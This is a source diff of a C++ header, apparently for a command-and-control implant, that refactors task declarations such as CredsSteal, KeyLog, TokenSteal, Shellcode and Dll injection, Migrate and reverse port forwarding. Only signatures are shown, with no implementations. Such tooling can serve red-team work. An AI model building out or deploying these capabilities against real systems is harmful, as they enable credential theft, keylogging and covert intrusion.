@@ -19,6 +19,7 @@
 #include <map>
 #include <string>
 #include <vector>
+
 #include "core/macros.hpp"
 #include "core/state.hpp"
 #include "core/stdout.hpp"
@@ -62,11 +63,6 @@ namespace Task
         );
     }
 
-    namespace Helper::Rportfwd
-    {
-        void HandleClient(SOCKET client, SOCKET remote);
-    }
-
     namespace Helper::Screenshot
     {
         BOOL InitInstance(HINSTANCE hInstance, INT nCmdShow);
@@ -87,17 +83,18 @@ namespace Task
 
     std::wstring Cat(const std::wstring& wFilePath);
     std::wstring Cd(const std::wstring& wDestDir);
-    std::wstring Connect(State::StateManager& sm, const std::wstring& wListenerURL);
+    std::wstring Connect(State::PState pState, const std::wstring& wListenerURL);
     std::wstring Cp(const std::wstring& wSrc, const std::wstring& wDest);
     std::wstring CredsSteal();
-    std::wstring Dll(State::StateManager& sm, const std::wstring& wPid, const std::wstring& wSrc);
-    std::wstring Download(State::StateManager& sm, const std::wstring& wSrc, const std::wstring& wDest);
+    std::wstring Dll(State::PState pState, const std::wstring& wPid, const std::wstring& wSrc);
+    std::wstring Download(State::PState pState, const std::wstring& wSrc, const std::wstring& wDest);
+    std::wstring EnvLs();
     std::wstring Execute(const std::wstring& wCmd);
     std::wstring Groups();
     std::wstring History();
     std::wstring Ip();
     std::wstring KeyLog(const std::wstring& wLogTime);
-    std::wstring Kill();
+    std::wstring Kill(State::PState pState);
     std::wstring Ls(const std::wstring& wDir);
     std::wstring Migrate(const std::wstring& wPid);
     std::wstring Mkdir(const std::wstring& wDir);
@@ -111,15 +108,16 @@ namespace Task
     std::wstring RegValues(const std::wstring& wRootKey, const std::wstring& wSubKey, BOOL bRecurse);
     std::wstring Rm(const std::wstring& wFile);
     std::wstring Rmdir(const std::wstring& wDir);
-    std::wstring RportfwdAdd(State::StateManager& sm, const std::wstring& wLport, const std::wstring& wIP, const std::wstring& wPort);
+    std::wstring RportfwdAdd(State::PState pState, const std::wstring& wLIP, const std::wstring& wLPort, const std::wstring& wFwdIP, const std::wstring& wFwdPort);
+    std::wstring RportfwdLs(State::PState pState);
     std::wstring RportfwdRm(const std::wstring& wIP, const std::wstring& wPort);
     std::wstring RunAs(const std::wstring& wUser, const std::wstring& wPassword, const std::wstring& wCmd);
-    std::wstring Screenshot(State::StateManager& sm);
-    std::wstring Shellcode(State::StateManager& sm, const std::wstring& wPid, const std::wstring& wSrc);
-    std::wstring Sleep(State::StateManager& sm, const std::wstring& wSleepTime);
+    std::wstring Screenshot(State::PState pState);
+    std::wstring Shellcode(State::PState pState, const std::wstring& wPid, const std::wstring& wSrc);
+    std::wstring Sleep(State::PState pState, const std::wstring& wSleep);
     std::wstring TokenRevert();
     std::wstring TokenSteal(const std::wstring& wPid, const std::wstring& wProcName);
-    std::wstring Upload(State::StateManager& sm, const std::wstring& wSrc, const std::wstring& wDest);
+    std::wstring Upload(State::PState pState, const std::wstring& wSrc, const std::wstring& wDest);
     std::wstring Users();
     std::wstring Whoami();
     std::wstring WhoamiPriv();
